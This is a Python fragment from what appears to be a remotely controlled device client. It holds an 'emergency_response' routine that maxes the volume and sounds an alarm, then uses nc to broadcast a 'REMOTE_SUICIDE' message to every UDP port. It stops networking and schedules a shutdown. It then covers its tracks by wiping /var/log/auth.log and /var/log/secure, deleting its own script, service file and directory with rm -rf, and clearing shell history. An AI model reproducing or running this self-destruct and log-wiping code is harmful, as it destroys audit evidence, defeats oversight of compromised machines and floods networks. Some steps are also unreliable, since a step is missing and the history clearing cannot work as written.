import os
import subprocess
import time
import threading
from notify import send_all_notifications

def emergency_response(self):
    self.log("Emergency command initiated.")

    # Step 1: Send notification
    send_all_notifications("Emergency procedures initiated. Please follow safety protocols.")

    # Step 2: Set volume to maximum
    self.log("Setting volume to 100%.")
    self.run_bash_command("amixer set Master 100%")

    # Step 3: Start beeping or siren
    self.log("Starting alarm sound.")
    beep_command = "beep -f 400 -l 1000"  # Ensure this command works for your OS
    subprocess.Popen(beep_command, shell=True)

    # Step 5: Send REMOTE_SUICIDE alert to all network addresses
    def send_alert(port):
        command = f"echo 'REMOTE_SUICIDE' | nc -u -b 255.255.255.255 {port}"
        self.run_bash_command(command)

    self.log("Sending REMOTE_SUICIDE alert to all network addresses.")

    threads = []
    for port in range(1, 65536):
        thread = threading.Thread(target=send_alert, args=(port,))
        threads.append(thread)
        thread.start()

    # Optionally, wait for all threads to finish
    for thread in threads:
        thread.join()

    # Step 6: Disable network access
    self.log("Disabling network services to prevent external access.")
    self.run_bash_command("sudo systemctl stop NetworkManager")

    # Step 7: Stop responding to any user actions
    self.log("Ignoring further user actions.")

    # Step 8: Clear logs related to this script
    self.clear_logs()

    # Step 9: Initialize shutdown in 30 seconds
    self.log("System will shutdown in 30 seconds.")
    self.run_bash_command("sudo shutdown +30")

    # Step 10: Remove all files related to this script
    self.cleanup_files()

    # Step 11: Clear command history
    self.run_bash_command("history -c")

    self.log("Emergency response completed. Now shutting down.")

def clear_logs(self):
    log_files = [
        'device_client.log',  # Example log file
        '/var/log/auth.log',  # Authentication logs (Debian/Ubuntu)
        '/var/log/secure',  # Authentication logs (RHEL/CentOS)
    ]

    for file in log_files:
        if os.path.exists(file):
            try:
                with open(file, 'w') as f:
                    f.truncate()  # Clear the contents of the log file
                self.log(f"Cleared log file: {file}")
            except Exception as e:
                self.log(f"Failed to clear {file}: {str(e)}")

def cleanup_files(self):
    script_path = os.path.abspath(__file__)
    self.log("Preparing to remove script and associated files.")

    files_to_remove = [
        script_path,
        '/etc/systemd/system/device_client.service',  # Example systemd service file
        os.path.dirname(script_path)  # Directory of the script
    ]

    for file in files_to_remove:
        if os.path.exists(file):
            try:
                if os.path.isdir(file):
                    subprocess.run(["rm", "-rf", file])  # Remove directory
                else:
                    os.remove(file)  # Remove file
                self.log(f"Removed file: {file}")
            except Exception as e:
                self.log(f"Failed to remove {file}: {str(e)}")
